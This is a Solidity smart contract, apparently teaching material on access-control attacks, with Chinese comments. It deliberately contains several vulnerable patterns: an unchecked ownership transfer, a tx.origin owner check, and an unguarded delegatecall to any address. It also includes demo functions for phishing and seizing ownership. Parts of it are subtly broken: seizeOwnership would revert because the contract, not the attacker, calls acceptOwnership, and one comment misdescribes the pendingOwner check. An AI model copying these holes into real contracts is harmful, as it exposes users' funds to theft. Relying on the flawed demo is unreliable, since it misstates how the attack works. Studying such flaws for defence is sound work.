// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title AccessControlAttack
 * @notice 访问控制绕过攻击
 * @dev 利用合约中权限检查的漏洞
 */
contract AccessControlAttack {
    address public owner;
    address public pendingOwner;

    mapping(address => bool) public admins;
    mapping(bytes4 => bool) public protectedFunctions;

    event OwnershipTaken(address indexed newOwner);
    event AdminAdded(address indexed admin);

    constructor() {
        owner = msg.sender;
        admins[msg.sender] = true;
    }

    /**
     * @notice 漏洞1：不检查调用者即转移所有权
     */
    function transferOwnership(address newOwner) external {
        // VULNERABLE: 没有权限检查！
        pendingOwner = newOwner;
    }

    /**
     * @notice 漏洞2：任何人都可以确认所有权转移
     */
    function acceptOwnership() external {
        require(msg.sender == pendingOwner, "Not pending owner");
        owner = msg.sender;
        admins[msg.sender] = true;
        emit OwnershipTaken(msg.sender);
    }

    /**
     * @notice 漏洞3：tx.origin 权限检查可被钓鱼绕过
     */
    function sensitiveAction() external {
        // VULNERABLE: 使用tx.origin而非msg.sender
        require(tx.origin == owner, "Not owner via tx.origin");
        // 执行敏感操作...
    }

    /**
     * @notice 漏洞4：delegatecall 导致上下文混淆
     */
    function delegateAdminAction(address _impl, bytes calldata data) external {
        // VULNERABLE: delegatecall 不检查权限且改变自身状态
        (bool success, ) = _impl.delegatecall(data);
        require(success, "Delegatecall failed");
    }

    /**
     * @notice 攻击演示：利用tx.origin钓鱼
     */
    function txOriginPhishing(address target) external {
        // 当owner通过中间合约调用时，tx.origin仍是owner
        // 中间合约调用此函数即可绕过检查
        AccessControlAttack(target).sensitiveAction();
    }

    /**
     * @notice 攻击演示：抢注所有权
     */
    function seizeOwnership(address target) external {
        AccessControlAttack vuln = AccessControlAttack(target);
        vuln.transferOwnership(msg.sender);
        vuln.acceptOwnership();
    }
}
